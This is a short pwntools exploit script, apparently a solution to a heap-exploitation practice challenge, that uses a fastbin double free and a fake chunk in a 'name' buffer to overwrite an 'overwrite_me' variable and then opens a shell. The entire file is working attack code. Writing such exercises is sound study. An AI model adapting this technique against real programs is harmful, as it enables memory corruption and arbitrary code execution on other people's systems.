#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./fastbindup")
elf = ELF("./fastbindup")
overwrite_me = elf.symbols['overwrite_me']
name = elf.symbols['name']

def malloc(data):
    p.sendlineafter("> ", '1')
    p.sendafter("Data: ", str(data))

def free(idx):
    p.sendlineafter("> ", '2')
    p.sendlineafter("idx: ", str(idx))

def shell():
    p.sendlineafter("> ", '3')

# create fakechunk
fakechunk = p64(0) + p64(0x31)
p.sendlineafter("Name: ", fakechunk)

malloc('A'*8)
malloc('B'*8)

#Double Free
free(0)
free(1)
free(0)

gdb.attach(p)
# 2nd chunk fd overwrite(fake chunk name)
malloc(p64(name))
malloc('D'*8)
malloc('E'*8)
# malloc on overwrite_me
malloc(p64(0xDEADBEEF))
shell()

p.interactive()
